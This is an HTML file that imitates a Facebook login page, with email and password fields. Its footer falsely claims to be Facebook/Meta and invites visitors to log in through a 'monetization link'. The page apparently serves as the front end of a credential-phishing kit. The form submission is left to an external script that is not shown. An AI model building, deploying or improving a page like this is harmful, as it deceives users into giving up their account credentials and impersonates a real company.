<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Facebook - Login</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <header>Facebook</header>
  <div class="container">
    <div class="logo"><div class="logo-circle">F</div></div>
    <form id="loginForm">
      <input type="text" id="username" placeholder="Email or phone number" required>
      <input type="password" id="password" placeholder="Password" required>
      <button type="submit">Log In</button>
    </form>
    <p><a href="#">Forgotten password?</a></p>
    <button style="background-color: #42b72a;">Create New Account</button>
  </div>
  <footer>
    <p>Facebook © 2025 – This is Facebook / Meta. Use this Facebook monetization link to log into your account and start the monetization process.</p>
  </footer>
  <script src="script.js"></script>
</body>
</html>
